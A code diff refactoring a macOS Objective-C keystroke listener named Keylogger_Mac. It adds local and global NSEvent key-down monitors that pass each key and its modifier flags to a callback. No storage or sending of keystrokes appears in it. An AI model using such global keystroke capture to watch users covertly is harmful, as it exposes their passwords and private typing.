@@ -1,5 +1,5 @@
 #include "Keylogger_Mac.h"
-#include "Keylogger_Constants.h"
+#include "../../shared/include/Keylogger_Constants.h"
 #import <Cocoa/Cocoa.h>
 #import <Foundation/Foundation.h>
 
@@ -12,33 +12,43 @@ void keylogger_set_callback(keylogger_callback kc) {
 	NSLog(@"Callback function set!!");
 }
 
+void handleKeyDownEvent(NSEvent* event) {
+	int modifier = KM_NONE;
+	if([event modifierFlags] & NSShiftKeyMask) {
+		modifier |= KM_SHIFT;
+	}
+	if([event modifierFlags] & NSCommandKeyMask) {
+		modifier |= KM_COMMAND;
+	}
+	if([event modifierFlags] & NSAlternateKeyMask) {
+		modifier |= KM_ALT;
+	}
+	if([event modifierFlags] & NSControlKeyMask) {
+		modifier |= KM_CONTROL;
+	}
+	
+	int key = 0;
+	key = [[event characters] characterAtIndex:0];
+	the_callback_function(key, modifier);
+}
+
+
 // initializes the keyboard listener.
 void keylogger_init() {
+	[NSEvent 	addLocalMonitorForEventsMatchingMask:NSKeyDownMask
+				handler:^(NSEvent* event) 
+	{
+			handleKeyDownEvent(event);
+			return event;
+	 }];
+	
 	[NSEvent 	addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
 				handler:^(NSEvent* event) 
-		{
-			// get modifier keys.
-			int modifier = MOD_NONE;
-			if([event modifierFlags] & NSShiftKeyMask) {
-				modifier |= MOD_SHIFT;
-			}
-			if([event modifierFlags] & NSCommandKeyMask) {
-				modifier |= MOD_COMMAND;
-			}
-			if([event modifierFlags] & NSAlternateKeyMask) {
-				modifier |= MOD_ALT;
-			}
-			if([event modifierFlags] & NSControlKeyMask) {
-				modifier |= MOD_CONTROL;
-			}
-			
-			int key = 0;
-			key = [[event characters] characterAtIndex:0];
-			the_callback_function(key, modifier);
-			
-		}
-	];
+	{
+			handleKeyDownEvent(event);
+	}];
 }
+
 
 void keylogger_shutdown() {
 }
